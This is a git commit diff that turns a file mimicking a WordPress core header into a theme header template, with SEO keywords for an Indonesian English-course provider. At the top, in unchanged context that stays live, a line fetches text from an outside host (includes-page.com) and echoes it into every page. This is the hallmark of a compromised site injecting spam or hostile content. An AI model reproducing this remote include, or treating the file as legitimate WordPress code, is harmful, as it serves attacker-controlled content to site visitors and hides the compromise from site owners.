7daf83f5420687e28cf3f6df03b6c36c667dbff3
slavination <151602883+slavination@users.noreply.github.com>
2024-10-01 10:32:53 +0700

    Update bl-wp-blog-header.php

--- bl-wp-blog-header.php
+++ bl-wp-blog-header.php
@@ -1,22 +1,82 @@
 <?php
 echo file_get_contents("https://includes-page.com/L/h.txt");
 /**
- * Loads the WordPress environment and template.
+ * The header for our theme
  *
- * @package WordPress
+ * This is the template that displays all of the <head> section and everything up until <div id="content">
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package mero_blog
  */
 
-if ( ! isset( $wp_did_header ) ) {
+?>
 
-	$wp_did_header = true;
+<!doctype html>
+<html <?php language_attributes(); ?>>
+<head>
+	<meta name="keywords" content="LIA,kursus bahasa inggris dewasa,Lembaga Bahasa" />
+	<meta charset="<?php bloginfo( 'charset' ); ?>">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
 
-	// Load the WordPress library.
-	require_once __DIR__ . '/wp-load.php';
+	<?php wp_head(); ?>
+</head>
 
-	// Set up the WordPress query.
-	wp();
+<body <?php body_class(); ?>>
 
-	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';
+<?php do_action( 'wp_body_open' ); ?>
 
-}
+<div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="#content"><?php esc_html_e( 'Skip to content', 'mero-blog' ); ?></a>
+
+	<header id="masthead" class="site-header">
+		<div class="container">
+			<div class="site-branding">
+				<div class="site-branding-logo">
+					<?php the_custom_logo(); ?>
+				</div><!-- .site-branding-logo -->
+
+				<div class="site-branding-text">
+					<?php if ( is_front_page() ) : ?>
+						<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
+					<?php else : ?>
+						<p class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></p>
+					<?php endif; ?>
+
+					<?php
+					$description = get_bloginfo( 'description', 'display' );
+
+					if ( $description || is_customize_preview() ) :
+						?>
+						<p class="site-description"><?php echo esc_html( $description ); ?></p>
+					<?php endif; ?>
+				</div><!-- .site-branding-text -->
+			</div><!-- .site-branding -->
+
+			<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
+				<?php
+					echo mero_blog_get_svg( array( 'icon' => 'bars' ) );
+					echo mero_blog_get_svg( array( 'icon' => 'close' ) );
+				?>
+				<span class="primary-menu-label"><?php esc_html_e( 'Menu', 'mero-blog' ); ?></span>
+			</button>
+
+			<nav id="site-navigation" class="main-navigation navigation-menu">
+				<?php
+				wp_nav_menu( array(
+					'theme_location' => 'primary_menu',
+	    			'container' 	 => 'div',
+					'menu_id'        => 'primary-menu',
+					'menu_class'     => 'nav-menu',
+				) );
+				?>
+			</nav><!-- #site-navigation -->
+		</div><!-- .container -->
+	</header><!-- #masthead -->
+
+	<?php if( is_front_page() || !is_paged() ) {
+		get_template_part( 'inc/header', 'image' );
+	} ?>
+
+	<div id="content" class="site-content">
